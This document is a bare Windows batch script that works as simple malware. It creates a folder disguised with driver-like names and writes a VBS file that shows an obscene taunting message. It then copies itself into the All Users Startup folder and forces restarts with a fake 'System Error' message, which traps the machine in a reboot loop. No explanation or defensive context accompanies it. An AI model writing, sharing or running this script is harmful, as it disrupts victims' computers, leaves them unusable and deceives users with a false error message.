   @echo off
   cls
   if not exist C:\APX DRIVERS32\Q53As\kern45.vbs goto make
   if exist C:\APX DRIVERS32\Q53As\kern45.vbs goto open
   :make
   MD C:\APX DRIVERS32\Q53As
   echo MsgBox "U R Screwed MotherFucker" >> C:\APX DRIVERS32\Q53As\kern45.vbs
   goto end1
   :open
   "C:\APX DRIVERS32\Q53As\kern45.vbs"
   shutdown -r -t 3 -c "Hahahahahaha"
   :end1
   copy %0 C:\Docume~1\All Users\Start Menu\Programs\Startup\r.bat
   shutdown -r -t 9 -c "System Error Has Occured, Restarting..."
